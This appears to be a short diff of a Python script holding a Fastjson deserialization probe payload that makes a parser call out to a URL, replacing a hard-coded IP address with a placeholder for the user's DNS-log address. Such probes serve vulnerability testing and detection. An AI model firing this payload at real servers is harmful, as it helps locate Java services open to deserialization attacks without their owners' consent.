@@ -15,7 +15,7 @@ payload = '''
   "@type": "com.alibaba.fastjson.JSONObject",
   {
     "@type": "java.net.URL",
-    "val": "http://101.43.1.181:8000"
+    "val": "你的dnslog地址"
   }
 }
 '''
